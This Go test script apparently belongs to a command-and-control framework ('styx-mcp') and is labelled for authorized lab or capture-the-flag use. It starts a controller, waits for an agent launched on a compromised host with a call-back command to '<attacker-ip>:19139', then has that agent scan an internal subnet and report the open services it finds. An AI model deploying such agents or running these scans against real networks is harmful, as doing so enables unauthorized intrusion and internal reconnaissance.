// Lab smoke: real agent intranet start_scan with discover progress (authorized lab only).
//
//	# Terminal A — controller on free port (avoid clashing with MCP :19137):
//	go run ./scripts/lab_scan_smoke.go
//
//	# Terminal B / RCE — agent:
//	./agent -s ctfsecret -c <attacker-ip>:19139
//
// Env:
//
//	STYX_SECRET (default ctfsecret)
//	STYX_LISTEN (default 0.0.0.0:19139)
//	STYX_SCAN_TARGETS (default 172.16.23.0/24)
//	STYX_SCAN_MODE (default fast)
//	STYX_SCAN_FP (default 1)
//	STYX_SCAN_DISCOVER (default 1)
//	STYX_SCAN_METHOD (default auto)
//
//go:build ignore

package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"styx-mcp/pkg/controller"
	"styx-mcp/pkg/protocol"
	"styx-mcp/pkg/tasks"
	"styx-mcp/pkg/topology"
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
	log.SetPrefix("lab-scan ")

	secret := env("STYX_SECRET", "ctfsecret")
	listen := env("STYX_LISTEN", "0.0.0.0:19139")
	targets := env("STYX_SCAN_TARGETS", "172.16.23.0/24")
	mode := env("STYX_SCAN_MODE", "fast")
	fp := env("STYX_SCAN_FP", "1") != "0"
	discover := env("STYX_SCAN_DISCOVER", "1") != "0"
	method := env("STYX_SCAN_METHOD", "auto")

	ctrl := controller.NewController(&controller.Options{
		Secret:     secret,
		Listen:     listen,
		Downstream: "raw",
	})
	if err := ctrl.Start(); err != nil {
		log.Fatalf("controller start: %v", err)
	}
	log.Printf("listening %s — deploy agent: -s %s -c <attacker-ip>:%s", listen, secret, portOf(listen))
	log.Printf("scan plan targets=%s mode=%s discover=%v method=%s fp=%v", targets, mode, discover, method, fp)

	deadline := time.Now().Add(60 * time.Second)
	var nodes []topology.NodeEntry
	for time.Now().Before(deadline) {
		nodes = ctrl.ListNodes()
		if len(nodes) >= 1 {
			break
		}
		time.Sleep(300 * time.Millisecond)
	}
	if len(nodes) == 0 {
		log.Fatal("FAIL: no agents within 60s")
	}
	pick := nodes[0]
	for _, e := range nodes {
		for _, a := range e.Node.LocalAddrs {
			if strings.HasPrefix(a, "172.16.23.") {
				pick = e
			}
		}
	}
	for _, e := range ctrl.ListNodes() {
		log.Printf("node id=%d uuid=%s peer=%s local=%v", e.ID, e.Node.UUID, e.Node.CurrentIP, e.Node.LocalAddrs)
	}
	log.Printf("using id=%d uuid=%s", pick.ID, pick.Node.UUID)

	task := ctrl.TaskManager.Create("start_scan")
	ctrl.TaskManager.UpdateStatus(task.ID, tasks.Running)
	if discover {
		ctrl.TaskManager.SetPhase(task.ID, "discovering")
	} else {
		ctrl.TaskManager.SetPhase(task.ID, "scanning")
	}

	fpFlag := uint16(0)
	if fp {
		fpFlag = 1
	}
	discFlag := uint16(1)
	if !discover {
		discFlag = 2
	}
	req := &protocol.ScanReq{
		TaskIDLen:      uint16(len(task.ID)),
		TaskID:         task.ID,
		TargetsLen:     uint32(len(targets)),
		Targets:        targets,
		ModeLen:        uint16(len(mode)),
		Mode:           mode,
		Fingerprint:    fpFlag,
		Concurrency:    80,
		TimeoutMs:      600,
		MaxHosts:       300,
		MaxDurationSec: 180,
		Discover:       discFlag,
		MethodLen:      uint16(len(method)),
		Method:         method,
	}
	if err := ctrl.StartScan(pick.Node.UUID, req); err != nil {
		log.Fatalf("StartScan send: %v", err)
	}
	log.Printf("SCANREQ sent task=%s", task.ID)

	timeout := time.After(200 * time.Second)
	ticker := time.NewTicker(400 * time.Millisecond)
	defer ticker.Stop()
	var lastPhase, lastProgKey string
	sawDiscovering := false
	sawProgress := false

	for {
		select {
		case <-timeout:
			t, _ := ctrl.TaskManager.Get(task.ID)
			log.Fatalf("timeout status=%s phase=%s err=%s result=%v", t.Status, t.Phase, t.Error, t.Result)
		case <-ticker.C:
			t, ok := ctrl.TaskManager.Get(task.ID)
			if !ok {
				continue
			}
			if t.Phase == "discovering" {
				sawDiscovering = true
			}
			if t.Phase != lastPhase {
				log.Printf("phase → %s status=%s", t.Phase, t.Status)
				lastPhase = t.Phase
			}
			if prog, ok := t.Result["progress"].(map[string]interface{}); ok {
				sawProgress = true
				key := fmt.Sprintf("%v/%v/%v/%v", prog["stage"], prog["icmp_done"], prog["alive_n"], prog["tcp_probes"])
				if key != lastProgKey {
					log.Printf("progress stage=%v icmp_done=%v/%v icmp_alive=%v alive_n=%v tcp_probes=%v",
						prog["stage"], prog["icmp_done"], prog["icmp_total"], prog["icmp_alive"], prog["alive_n"], prog["tcp_probes"])
					lastProgKey = key
				}
			}
			if t.Status == tasks.Done {
				b, _ := json.MarshalIndent(t.Result, "", "  ")
				fmt.Println("=== SCAN RESULT ===")
				fmt.Println(string(b))
				summarize(t.Result)
				// Soft checks for lab observability / hybrid discover.
				if discover && !sawDiscovering {
					log.Printf("WARN: never observed phase=discovering (may have been too fast)")
				}
				if discover && !sawProgress {
					log.Printf("WARN: never observed result.progress ticks")
				}
				stats, _ := t.Result["stats"].(map[string]interface{})
				if discover && stats != nil {
					if stats["discover_mode"] == nil && stats["discover_ms"] == nil {
						log.Fatal("FAIL: missing discover stats on completed task")
					}
					log.Printf("PASS hybrid fields present discover_mode=%v icmp_alive=%v fallback=%v",
						stats["discover_mode"], stats["icmp_alive"], stats["fallback"])
				}
				if sawProgress {
					log.Printf("PASS saw progressive discover progress via task.result.progress")
				}
				return
			}
			if t.Status == tasks.Failed {
				log.Fatalf("scan failed phase=%s err=%s", t.Phase, t.Error)
			}
		}
	}
}

func summarize(result map[string]interface{}) {
	stats, _ := result["stats"].(map[string]interface{})
	log.Printf("stats: %+v", stats)
	if w, ok := result["warnings"]; ok {
		log.Printf("warnings: %v", w)
	}
	openRaw, _ := result["open"]
	b, _ := json.Marshal(openRaw)
	var opens []map[string]interface{}
	_ = json.Unmarshal(b, &opens)
	log.Printf("open ports: %d", len(opens))
	for _, o := range opens {
		refsN := 0
		if r, ok := o["refs"].([]interface{}); ok {
			refsN = len(r)
		}
		log.Printf("  %v:%v product=%v service=%v refs=%d conf=%v evidence=%q",
			o["ip"], o["port"], o["product"], o["service"], refsN, o["confidence"], trim(fmt.Sprint(o["evidence"]), 80))
	}
	if sum, ok := result["summary"].(map[string]interface{}); ok {
		b, _ := json.MarshalIndent(sum["interesting"], "", "  ")
		log.Printf("interesting:\n%s", string(b))
	}
}

func env(k, def string) string {
	if v := strings.TrimSpace(os.Getenv(k)); v != "" {
		return v
	}
	return def
}

func portOf(listen string) string {
	if i := strings.LastIndex(listen, ":"); i >= 0 {
		return listen[i+1:]
	}
	return listen
}

func trim(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
